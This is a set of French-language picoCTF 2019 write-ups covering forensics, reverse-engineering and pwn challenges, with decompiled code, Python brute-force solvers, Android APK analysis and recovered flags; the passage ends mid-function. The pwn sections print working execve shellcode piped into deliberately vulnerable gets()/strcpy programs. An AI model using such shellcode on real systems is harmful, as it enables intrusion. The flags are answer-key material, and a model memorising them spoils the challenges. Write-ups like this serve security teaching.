We found this [packet capture](https://2019shell1.picoctf.com/static/470e17b168561f9eabdfa95e412dbe10/capture.pcap) and [key](https://2019shell1.picoctf.com/static/470e17b168561f9eabdfa95e412dbe10/picopico.key). Recover the flag.

------

### Résolution

---

Bah comme le WebNet0 sauf que c est une image qui contient le flag (mais on le voit quand mm dans wireshark).  

```bash
$ strings vulture.jpg |grep pico
picoCTF{honey.roasted.peanuts}
```

`picoCTF{honey.roasted.peanuts}`


# forensic_450_investigation_encoded_1

------

### Titre : c0rrupt

### Points : 450

------

### Description

------

We have recovered a binary and 1 file: image01. See what you can make of it. Its also found in /problems/investigation-encoded-1_6_172edc378b5282150ec24be19ff8342b on the shell server. NOTE: The flag is not in the normal picoCTF{XXX} format.

#### Hints

* 

------

### Résolution

---

```bash
$ file mystery 
mystery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=29b4dba83a1a5a26d76e122ad48d63cff886b075, not stripped

$ xxd output
00000000: 8e8e ba3b b8ea 23a8 ee8e ae3b 8ae2 e8aa  ...;..#....;....
00000010: 38ae 3bb8 ae00
```

```c
undefined8 main(void) {
  long size;
  size_t sVar1;
  undefined4 i;
  int local_14;
  FILE *flag_fd;
  
  flag_fd = fopen("flag.txt","r");
  if (flag_fd == (FILE *)0x0) {
    fwrite("./flag.txt not found\n",1,0x15,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  flag_size = 0;
  fseek(flag_fd,0,2);
  size = ftell(flag_fd);
  flag_size = (int)size;
  fseek(flag_fd,0,0);
  if (0xfffe < flag_size) {
    fwrite("Error, file bigger that 65535\n",1,0x1e,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  flag = malloc((long)flag_size);
  sVar1 = fread(flag,1,(long)flag_size,flag_fd);
  local_14 = (int)sVar1;
  if (local_14 < 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  i = 0;
  flag_index = &i;
  output = fopen("output","w");
  buffChar = 0;
  remain = 7;
  fclose(flag_fd);
  encode();
  fclose(output);
  fwrite("I\'m Done, check ./output\n",1,0x19,stderr);
  return 0;
}
```

Lecture du `flag.txt` et on appelle `encode()`.

```c
void encode(void) {
  int iVar1;
  undefined8 uVar2;
  ulong new_char_int;
  ulong uVar3;
  int local_10;
  char new_char;
  byte char;
  
  while( true ) {
    if (flag_size <= *flag_index) {
      while (remain != 7) {
        save(0);
      }
      return;
    }
    char = *(byte *)((long)*flag_index + flag);
    uVar2 = isValid(char);
    if ((char)uVar2 != '\x01') break;
    new_char_int = lower(char);
    new_char = (char)new_char_int;
    if (new_char == ' ') {
      new_char = '{';
    }
    local_10 = *(int *)(matrix + (long)((int)new_char + -0x61) * 8 + 4);
    iVar1 = local_10 + *(int *)(matrix + (long)((int)new_char + -0x61) * 8);
    while (local_10 < iVar1) {
      uVar3 = getValue(local_10);
      save((byte)uVar3);
      local_10 = local_10 + 1;
    }
    *flag_index = *flag_index + 1;
  }
  fwrite("Error, I don\'t know why I crashed\n",1,0x22,stderr);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

```c
undefined8 isValid(char c) {
  undefined8 uVar1;
  
  if ((c < 'a') || ('z' < c)) {
    if ((c < 'A') || ('Z' < c)) {
      if (c == ' ') {
        uVar1 = 1;
      }
      else {
        uVar1 = 0;
      }
    }
    else {
      uVar1 = 1;
    }
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

```c
ulong lower(byte c) {
  ulong uVar1;
  
  if (((char)c < 'A') || ('Z' < (char)c)) {
    uVar1 = (ulong)c;
  }
  else {
    uVar1 = (ulong)((uint)c + 0x20);
  }
  return uVar1;
}
```

```c
ulong getValue(int char) {
  byte bVar1;
  int iVar2;
  
  iVar2 = char;
  if (char < 0) {
    iVar2 = char + 7;
  }
  bVar1 = (byte)(char >> 0x37);
  return (ulong)((int)(uint)(byte)secret[(long)(iVar2 >> 3)] >>
                 (7 - (((char)char + (bVar1 >> 5) & 7) - (bVar1 >> 5)) & 0x1f) & 1);
}
```

```c
void save(byte char) {
  buffChar = buffChar | char;
  if (remain == 0) {
    remain = 7;
    fputc((int)(char)buffChar,output);
    buffChar = '\0';
  }
  else {
    buffChar = buffChar * '\x02';
    remain = remain + -1;
  }
  return;
}
```

Pour faire simple, c'est une fonction qui va chiffrer le contenu de `flag.txt`.

Pour résoudre ce challenge, nous allons ré-implémenter le chiffrement en python et réaliser une attaque brute force sur le chiffré et comparé à chaque fois avec le chiffré du flag que nous possédons. 

```python
#!/usr/bin/env python3                                                  
                                                                        
import string                                                           
import sys                                                              
                                                                        
secret = 'b8ea8eba3a88ae8ee8aa28bbb8eb8ba8ee3a3bb8bba3bae2e8a8e2b8ab8bb8
eae3aee3ba80'                                                           
secret = [int(secret[i:i+2],16) for i in range(0, len(secret), 2)]      
                                                                        
matrix = '08000000000000000c000000080000000e000000140000000a00000022000000040000002c0000000c000000300000000c0000003c0000000a00000048000000060000005200000010000000580000000c000000680000000c000000740000000a00000080000000080000008a0000000e000000920000000e000000a000000010000000ae0000000a000000be00000008000000c800000006000000d00000000a000000d60000000c000000e00000000c000000ec0000000e000000f800000010000000060100000e000000160100000400000024010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'                               
matrix = [int(matrix[i:i+2],16) for i in range(0, len(matrix), 2)]      
                                                                        
cipher = open('output_flag', 'rb').read()                               
cipher = ''.join([bin(b)[2:].zfill(8) for b in cipher])

def getValue(res):
    var2 = res
    if res < 0:
        var2 = res + 7
    var1 = res >> 0x37
    return secret[var2 >> 3] >> (7 - ((res + (var1 >> 5) & 7) - (var1 >> 5)) & 0x1f) & 1

def lower(c):
    if chr(c) not in string.ascii_lowercase:
        c = c + 0x20
    return c

charset = string.ascii_lowercase
possibles = []
flag = ''
index = 0
commun = 0
while 1:
    possibles = []
    for c0 in charset:
        for c1 in charset:
            flag = flag[:index] + c0 + c1
            output = ''
            for c in flag.encode():
                c = lower(c)
                if c == b' ':
                    c = b'{'
                res1 = matrix[(c - 0x61) * 8 + 4]
                
                res2 = res1 + matrix[(c - 0x61)*8]
                
                while res1 < res2:
                    output += str(getValue(res1))
                    res1 += 1
            if output[:commun] == cipher[:commun]:
                possibles.append(flag)
    if len(possibles) == 1:
        flag = flag[:index] + possibles[0][-2]
        print(flag)
        index += 1
        commun += 3
    else:
        commun += 1
```

Le but est de tester petit à petit des petits blocs de clair, puis de les chiffrer et de comparer avec une partie de `output_flag`, si une seule entrant est possible alors on considère que cette entrée est bonne et on avance.

```bash
$ python3 resolv.py
e
en
enc
enco
encod
encode
encoded
encodedg
encodedgx
encodedgxm
encodedgxmu
encodedgxmur
encodedgxmurh
encodedgxmurht
encodedgxmurhtu
encodedgxmurhtuo
encodedgxmurhtuou
```

`encodedgxmurhtuou`


# forensic_500_investigation_encoded_2

------

### Titre : investigation_encoded_2

### Points : 500

------

### Description

------

We have recovered a binary and 1 file: image01. See what you can make of it. Its also found in /problems/investigation-encoded-2_0_bf594e1542e760d4c72cc1401d71b3eb on the shell server. NOTE: The flag is not in the normal picoCTF{XXX} format.

#### Hints

* Only use lower case letters and numbers

------

### Résolution

---

```bash
$ file mystery
mystery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b3214ef986bc85652feb1040e5970f356b56dd71, not stripped

$ xxd output_flag 
00000000: baa3 aebb 8a3a ab8e aa3a ebb8 ea8e aae2  .....:...:......
00000010: eae8 eab8 eab8 eab8 eab8 eab8 eab8 eab8  ................
00000020: eab8 eab8 eab8 eab8 eaae 2ab8 eae8 bae8  ..........*.....
00000030: aeea 2bbb 8bae 8eab 80                   ..+......
```

```c
undefined8 main(void) {
  long lVar1;
  size_t sVar2;
  undefined4 local_18;
  int local_14;
  FILE *fd_flag;
  
  badChars = '\0';
  fd_flag = fopen("flag.txt","r");
  if (fd_flag == (FILE *)0x0) {
    fwrite("Error: file ./flag.txt not found\n",1,0x21,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  flag_size = 0;
  fseek(fd_flag,0,2);
  lVar1 = ftell(fd_flag);
  flag_size = (int)lVar1;
  fseek(fd_flag,0,0);
  login();
  if (0xfffe < flag_size) {
    fwrite("Error, file bigger than 65535\n",1,0x1e,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  flag = malloc((long)flag_size);
  sVar2 = fread(flag,1,(long)flag_size,fd_flag);
  local_14 = (int)sVar2;
  if (local_14 < 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  local_18 = 0;
  flag_index = &local_18;
  output = fopen("output","w");
  buffChar = 0;
  remain = 7;
  fclose(fd_flag);
  encode();
  fclose(output);
  if (badChars == '\x01') {
    fwrite("Invalid Characters in flag.txt\n./output is corrupted\n",1,0x35,stderr);
  }
  else {
    fwrite("I\'m Done, check file ./output\n",1,0x1e,stderr);
  }
  return 0;
}
```

```c
void login(void) {
  int iVar1;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined4 local_68;
  char local_58 [48];
  sa_family_t local_28;
  uint16_t local_26;
  undefined auStack36 [12];
  int local_18;
  int local_14;
  hostent *local_10;
  
  local_10 = gethostbyname("ZmFrZWF1dGhzaXRl.com"); // fakeauthsite
  local_14 = socket(2,1,0);
  local_28 = 2;
  local_26 = htons(0x929);
  bcopy(*local_10->h_addr_list,&local_28 + 4,(long)local_10->h_length);
  local_18 = connect(local_14,(sockaddr *)&local_28,0x10);
  if (local_18 == -1) {
    puts("Could not connect to Auth Server");
  }
  local_c8 = 0x6e43203a68747541;
  local_c0 = 0x33636c78575a7a56;
  local_b8 = 0x53593046475a674d;
  local_b0 = 0x6d61687057597142;
  local_a8 = 0x4b45;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  send(local_14,&local_c8,100,0);
  recv(local_14,local_58,0x21,0);
  iVar1 = strcmp(local_58,"QXV0aG9yaXplZCB0byBleGVjdXRlLi4u"); // Authorized to execute...
  if (iVar1 != 0) {
    puts("Permission not given by the Auth Server");
    printf(" answer: %s\n",local_58);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf(" answer: %s\n",local_58);
  shutdown(local_14,2);
  return;
}
```

```c
void encode(void) {
  byte bVar1;
  ulong uVar2;
  int iVar3;
  int res1;
  char falag_char;
  int res2;
  
  while (*flag_index < flag_size) {
    uVar2 = lower(*(byte *)((long)*flag_index + flag));
    falag_char = (char)uVar2;
    if (falag_char == ' ') {
      falag_char = -0x7b;
    }
    else {
      if (('/' < falag_char) && (falag_char < ':')) {
        falag_char = falag_char + 'K';
      }
    }
    falag_char = falag_char + -0x61;
    if ((falag_char < '\0') || ('$' < falag_char)) {
      badChars = 1;
    }
    if (falag_char != '$') {
      iVar3 = ((int)falag_char + 0x12) % 0x24;
      bVar1 = (byte)(iVar3 >> 0x1f);
      falag_char = ((byte)iVar3 ^ bVar1) - bVar1;
    }
    res1 = *(int *)(indexTable + (long)(int)falag_char * 4);
    res2 = *(int *)(indexTable + (long)((int)falag_char + 1) * 4);
    while (res1 < res2) {
      uVar2 = getValue(res1);
      save((byte)uVar2);
      res1 = res1 + 1;
    }
    *flag_index = *flag_index + 1;
  }
  while (remain != 7) {
    save(0);
  }
  return;
}
```

```c
ulong lower(byte c) {
  ulong uVar1;
  
  if (((char)c < 'A') || ('Z' < (char)c)) {
    uVar1 = (ulong)c;
  }
  else {
    uVar1 = (ulong)((uint)c + 0x20);
  }
  return uVar1;
}
```

```c
ulong getValue(int c) {
  byte bVar1;
  int iVar2;
  
  iVar2 = c;
  if (c < 0) {
    iVar2 = c + 7;
  }
  bVar1 = (byte)(c >> 0x37);
  return (ulong)((int)(uint)(byte)secret[(long)(iVar2 >> 3)] >>
                 (7 - (((char)c + (bVar1 >> 5) & 7) - (bVar1 >> 5)) & 0x1f) & 1);
}
```

```c
void save(byte c) {
  buffChar = buffChar | c;
  if (remain == 0) {
    remain = 7;
    fputc((int)(char)buffChar,output);
    buffChar = '\0';
  }
  else {
    buffChar = buffChar * '\x02';
    remain = remain + -1;
  }
  return;
}
```

```python
#!/usr/bin/env python3

import sys
import string
import binascii
import subprocess as sp

cipher = bin(int(binascii.hexlify(open('output_flag', 'rb').read()),16))[2:]

charset = string.ascii_lowercase + string.digits + ' '

flag = ''
possibles = []
commun = 3
index = 0
while 1:
    possibles = []
    for c in charset:
        sp.run(f'echo -n "{flag + c}" > flag.txt 2> /dev/null', shell=True)
        sp.run('./mystery_patched 2> /dev/null', shell=True)
        out = bin(int(binascii.hexlify(open('output', 'rb').read()),16))[2:]
        if out[:commun] == cipher[:commun]:
            possibles.append(c)
    if len(possibles) == 1:
        flag = flag[:index] + possibles[0]
        print(flag)
        index += 1
        commun += 3
    else:
        commun += 1
```

Même technique que pour `forensic_0450_investigation_encoded_1`. On réalise une attaque de brute force.

```bash
$ python3 resolv.py 
t
t1
t1m
t1m3
t1m3f
t1m3f1
t1m3f1i
t1m3f1i3
t1m3f1i35
t1m3f1i350
t1m3f1i3500
t1m3f1i35000
t1m3f1i350000
t1m3f1i3500000
t1m3f1i35000000
t1m3f1i350000000
t1m3f1i3500000000
t1m3f1i35000000000
t1m3f1i350000000000
t1m3f1i3500000000000
t1m3f1i35000000000003
t1m3f1i35000000000003d
t1m3f1i35000000000003d7
t1m3f1i35000000000003d74
t1m3f1i35000000000003d746
t1m3f1i35000000000003d746a
t1m3f1i35000000000003d746a4
t1m3f1i35000000000003d746a40
```

`t1m3f1i35000000000003d746a40`

# pwn_050_Handy_shellcode

------

### Titre : Handy_shellcode

### Points : 50

------

### Description 

Ce programme exécute n'importe quel shellcode que vous lui donnez. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt ? (Merci à google translate :))

------

#### Hints

* 

---

### Résolution

---

On se connecte vite en ssh sur le serveur shell puis une fois sur le serveur on trouve les trois fichiers suivants : flag.txt, vuln.c vuln. Je commence d'abord par analyser le programme c :
```c
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gidgit remote add [name_of_your_remote] [name_of_your_new_branch]
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```

Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) après quelques recherches concernant le shellcode j'ai trouvé ce payload :
```bash
$ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; cat )  | ./vuln
...
```

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/handy_shell.png)


`picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}`


# pwn_100_OverFlow_0

------

### Titre : OverFlow_0

### Points : 100

------

### Hints

* Trouver un moyen de déclencher l'affichage du flag.
* Si vous essayez de faire le calcul à la main, essayez peut-être d'ajouter quelques caractères supplémentaires. Parfois, il y a des choses que vous n'attendez pas.
------

### Description 

Cela devrait être facile. Déborder le tampon du programme pour le flag drapeau ?

### Résolution
En regardant, le code ci-dessouss on remarque qu'il suffit de déborder du buffer de taille 128 qui declenchèra un signal SIGFAULT qui sera capturé et affichera le flag dans la sorti stderr.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
...
```
![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/overflow0.png)

Le Flag est : 
`picoCTF{3asY_P3a5y1fcf81f9}`


# pwn_200_slippery_shellcode

------

### Titre : slippery-shellcode

### Points : 200

------

### Description 

Ce programme est un peu plus compliqué. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt? Vous pouvez trouver le programme dans /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 sur le serveur shell

------


### Résolution

Comme pour le handy shellcode je commence à analyser le code C ci-dessous :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```
Je comprends vite que ce code est presque le même qu'avec le handy-shellcode sauf qu'ici notre shellcode est executé après  un offset qui est modulo 256. Pour un début je tente donc de lui envoyer mon shellcode directement :  

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery1.png)

Mon shellcode est effectivement executer mais pas à la bonne adresse et j'ai un segmentation fault.
Je tente ensuite d'executer le programme en remplissant son buffer de 256  caractères suivi de mon shellcode.

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery2.png)

Et Hop j'ai effectivément un shell et le flag.


`picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}`


# reverse_300_droids0

------

### Titre : droids0

### Points : 300

------

### Description

------

Where do droid logs go. Check out this file. You can also find the file in /problems/droids0_0_205f7b4a3b23490adffddfcfc45a2ca3.

#### Hints

* Try using an emulator or device
* https://developer.android.com/studio

------

### Résolution

---

```bash
$ file zero.apk 
zero.apk: Zip archive data, at least v1.0 to extract
```

Nous allons utiliser `anbox` pour émuler un système Android. Il faut penser à autoriser l'installation des applications non-officielles: `Settings > Security > Unknown sources > ON`.

Nous allons utiliser `adb` pour communiquer avec notre `anbox`.

> Android Debug Bridge (adb) is a versatile command line  tool  that  lets  you communicate  with  an  emulator instance or connected Android-powered device.

```bash
# lister nos devices
$ adb devices
List of devices attached
emulator-5558   device

# si besoin
$ adb uninstall com.hellocmu.picoctf 
Success
```

```bash
$ adb install zero.apk 
Success
```

On installe notre apk avec `adb`. L'application demande un mot de passe pour obtenir le flag. D'après, la description du challenge, il faut chercher des données dans les logs. Nous allons lancer l'application et regarder les logs qu'elle crée.

```bash
$ adb --help
...
logcat                   show device log (logcat --help for more)
...
$ adb logcat
09-28 08:40:42.017   115   756 E SoundPool: Unable to load sample
09-28 08:40:45.645   667   667 I PICO    : picoCTF{a.moose.once.bit.my.sister}
09-28 08:40:45.667    39    97 I MediaPlayerService: MediaPlayerService::getOMX
```

En suivant les logs lorsque l'on soumet un mot de passe, on peut voir un flag sauvage qui apparaît.

`picoCTF{a.moose.once.bit.my.sister}`

# reverse_300_reverse_cipher

------

### Titre : reverse_cipher

### Points : 300

------

### Description

------

We have recovered a binary and a text file. Can you reverse the flag. Its also found in /problems/reverse-cipher_5_6e21330f568439d366f5c038e32e5572 on the shell server.

#### Hints

* objdump and Gihdra are some tools that could assist with this

------

### Résolution

---

```bash
$ file rev
rev: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=523d51973c11197605c76f84d4afb0fe9e59338c, not stripped

$ cat rev_this 
picoCTF{w1{1wq8c5ajc<a5}
```

Nous allons utiliser Ghidra pour analyser ce binaire.

```c
void main(void) {
  FILE *flag_fd;
  FILE *output;
  size_t sVar1;
  char flag [23];
  char local_41;
  FILE *output_fd;
  FILE *fd_flag;
  uint j;
  int i;
  char chr;
  
  flag_fd = fopen("flag.txt","r");
  output = fopen("rev_this","a");
  if (flag_fd == (FILE *)0x0) {
    puts("No flag found, please make sure this is run on the server");
  }
  if (output == (FILE *)0x0) {
    puts("please run this on the server");
  }
  sVar1 = fread(flag,0x18,1,flag_fd);
  if ((int)sVar1 < 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  i = 0;
  while (i < 8) {
    fputc((int)flag[(long)i],output);
    i = i + 1;
  }
  j = 8;
  while ((int)j < 0x17) {
    if ((j & 1) == 0) {
      chr = flag[(long)(int)j] + '\x05';
    }
    else {
      chr = flag[(long)(int)j] + -2;
    }
    fputc((int)chr,output);
    j = j + 1;
  }
  fputc((int)local_41,output);
  fclose(output);
  fclose(flag_fd);
  return;
}
```

Le programme ouvre `flag.txt`, le résultat sera stocké dans `rev_this`. On lis les `0x18` caractères du flag que l'on stocke dans `flag`. Pour les 8 premiers caractères du flag, on ne fait rien, cela correspond à `picoCTF{`. On applique un chiffrement par décalage sur le reste du flag en fonction de la valeur de `j`. Si `j` est pair, on applique un décalage de `-2`, s'il est impair, on applique un décalage de `+5`. Pour retrouver le flag, nous devons simplement inverser ce processus.

```python
#!/usr/bin/env python3

f = b'picoCTF{w1{1wq8c5ajc<a5}'

print(f[:8].decode(), end='')
for i in range(8, len(f)-1):
    if (i & 1) == 0:
        print(chr(f[i] - 0x5), end='')
    else:
        print(chr(f[i] + 2), end='')
print('}')
```

```bash
$ python3 resolv.py 
picoCTF{r3v3rs3e0cee7c0}
```

`picoCTF{r3v3rs3e0cee7c0}`

# reverse_350_droids1

------

### Titre : droids1

### Points : 350

------

### Description

------

Find the pass, get the flag. Check out this file. You can also find the file in /problems/droids1_0_b7f94e21c7e45e6604972f9bc3f50e24.

#### Hints

* Try using an emulator or device
* https://ibotpeaches.github.io/Apktool/
* https://developer.android.com/studio

------

### Résolution

---

```bash
$ file one.apk 
one.apk: Zip archive data, at least v1.0 to extract
```

Nous allons utiliser `jadx` pour reverser notre `apk`.

```java
// MainActivity
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView((int) C0272R.layout.activity_main);
    this.text_top = (TextView) findViewById(C0272R.C0274id.text_top);
    this.text_bottom = (TextView) findViewById(C0272R.C0274id.text_bottom);
    this.text_input = (EditText) findViewById(C0272R.C0274id.text_input);
    this.ctx = getApplicationContext();
    System.loadLibrary("hellojni");
    this.text_top.setText(C0272R.string.hint);
}

public void buttonClick(View view) { 	       	this.text_bottom.setText(FlagstaffHill.getFlag(this.text_input.getText().toString(), this.ctx));
}
```

C'est un `MainActivity` classique, lorsque l'on appuis sur le bouton, nous appelons `FlagstaffHill.getFlag(input)`.

```java
// FlagstaffHill
public static native String fenugreek(String str);
public static String getFlag(String input, Context ctx) {
    if (input.equals(ctx.getString(C0272R.string.password))) {
        return fenugreek(input);
    }
    return "NOPE";
}
```

Notre `input` est comparée à `C0272R.string.password`. Nous devons alors trouver sa valeur.

```bash
# avec jadx-gui
# Resources > resources.arcs > res > values > strings.xml
<string name="myotis">jackrabbit</string>
<string name="password">opossum</string>
<string name="porcupine">blackbuck</string>

# en cli
$ cat one/res/values/strings.xml | grep password
<string name="password">opossum</string>
```

Le mot de passe est donc `opossum`.

```bash
$ adb devices
List of devices attached
emulator-5558   device

# si besoin
$ adb uninstall com.hellocmu.picoctf 
Success
```

```bash
$ adb install one.apk 
Success
```

En fournissant le mot de passe, on obtient le flag.

`picoCTF{pining.for.the.fjords}`

# reverse_400_droids2

------

### Titre : droids2

### Points : 400

------

### Description

------

Where do droid logs go. Check out this file. You can also find the file in /problems/droids0_0_205f7b4a3b23490adffddfcfc45a2ca3.

#### Hints

* Try using an emulator or device
* https://developer.android.com/studio

------

### Résolution

---

```bash
$ file two.apk 
two.apk: Zip archive data, at least v1.0 to extract
```

Nous allons utiliser `jadx` pour reverser notre `apk`.

```java
// MainActivity
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView((int) C0272R.layout.activity_main);
    this.text_top = (TextView) findViewById(C0272R.C0274id.text_top);
    this.text_bottom = (TextView) findViewById(C0272R.C0274id.text_bottom);
    this.text_input = (EditText) findViewById(C0272R.C0274id.text_input);
    this.ctx = getApplicationContext();
    System.loadLibrary("hellojni");
    this.text_top.setText(C0272R.string.hint);
}

public void buttonClick(View view) {
  this.text_bottom.setText(FlagstaffHill.getFlag(this.text_input.getText().toString(), this.ctx));
}
```

Lorsque l'on clique sur le bouton `FlagstaffHill.getFlag(input)` est appélé.

```java
// FlagstaffHill
public static native String sesame(String str);

public static String getFlag(String input, Context ctx) {
    String[] witches = {"weatherwax", "ogg", "garlick", "nitt", "aching", "dismass"};
    int second = 3 - 3;
    int third = (3 / 3) + second;
    int fourth = (third + third) - second;
    int fifth = 3 + fourth;
    int sixth = (fifth + second) - third;
    String str = ".";
    if (input.equals("".concat(witches[fifth]).concat(str).concat(witches[third]).concat(str).concat(witches[second]).concat(str).concat(witches[sixth]).concat(str).concat(witches[3]).concat(str).concat(witches[fourth]))) {
        return sesame(input);
	}
    return "NOPE";
}
```

Notre `input` est comparé à une chaine construite à partir du tablea `witches`. Nous allons juste exécuter le code pour récupérer la sortie.

```java
class Test {

  public static void main(String[] args){
      
      String[] witches = {"weatherwax", "ogg", "garlick", "nitt", "aching", "dismass"};
      int second = 3 - 3;
      int third = (3 / 3) + second;
      int fourth = (third + third) - second;
      int fifth = 3 + fourth;
      int sixth = (fifth + second) - third;
      String str = ".";
      System.out.println("".concat(witches[fifth]).concat(str).concat(witches[third]).concat(str).concat(witches[second]).concat(str).concat(witches[sixth]).concat(str).concat(witches[3]).concat(str).concat(witches[fourth]));
        
  }
}
```

```bash
$ java resolv.java
dismass.ogg.weatherwax.aching.nitt.garlick
```

Nous devons donc fournir `dismass.ogg.weatherwax.aching.nitt.garlick` dans l'input de l'application.

```bash
$ adb devices
List of devices attached
emulator-5558   device

# si besoin
$ adb uninstall com.hellocmu.picoctf 
Success
```

```bash
$ adb install one.apk 
Success
```

Cela nous permet de récupérer le flag.

`picoCTF{what.is.your.favourite.colour}`

# reverse_400_need_for_speed

------

### Titre : Need For Speed

### Points : 400

------

### Description

------

The name of the game is speed. Are you quick enough to solve this problem and keep it above 50 mph? need-for-speed.

#### Hints

* What is the final key?

------

### Résolution

---

```bash
$ file need-for-speed 
need-for-speed: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=d01e199f92712e220af4ea6796c8ed4a0bbfcdf8, not stripped
```

```bash
$ ./need-for-speed 
Keep this thing over 50 mph!
============================

Creating key...
Not fast enough. BOOM!
```

Lorsque l'on exécute le binaire, on a le message suivant: `No fast anough`.

```c
undefined8 main(void) {
  header();
  set_timer();
  get_key();
  print_flag();
  return 0;
}
```

On peut voir qua dans les `main()`, avant l'appel à `get_key()`, il y a un appem à `set_timer()`.

```c
void header(void) {
  uint i;
  
  puts("Keep this thing over 50 mph!");
  i = 0;
  while (i < 0x1c) {
    putchar(0x3d);
    i = i + 1;
  }
  puts("\n");
  return;
}
```

```c
void set_timer(void) {
  __sighandler_t p_Var1;
  
  p_Var1 = __sysv_signal(0xe,alarm_handler);
  if (p_Var1 == (__sighandler_t)0xffffffffffffffff) {
    printf(
           "\n\nSomething bad happened here. \nIf running on the shell server\nPlease contact theadmins with \"need-for-speed.c:%d\".\n"
           ,0x3c);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  alarm(1);
  return;
}
```

```bash
$ kill -l
...
1)  SIGALRM
...
```

Le code met en place un signal `SIGALRM`.

```c
void get_key(void) {
  undefined8 k;
  
  puts("Creating key...");
  k = calculate_key();
  key = (undefined4)k;
  puts("Finished");
  return;
}
```

```c
undefined8 calculate_key(void) {
  int i;
  
  i = -0x2e081a88;
  do {
    i = i + -1;
  } while (i != -0x17040d44);
  return 0xe8fbf2bc;
}
```

C'est sûrement cette boucle qui nous fait perdre beaucoup de temps, pour au final pas grand chose, puisque l'on retourne toujours la même valeur.

```c
void print_flag(void) {
  puts("Printing flag:");
  decrypt_flag();
  puts(flag);
  return;
}
```

```c
void decrypt_flag(void) {
  uint uVar1;
  byte local_1c [16];
  uint i;
  
  i = 0;
  while (i < 0x37) {
    uVar1 = (uint)((int)i >> 0x1f) >> 0x1f;
    flag[(long)(int)i] = flag[(long)(int)i] ^ local_1c[(long)(int)((i + uVar1 & 1) - uVar1)];
    i = i + 1;
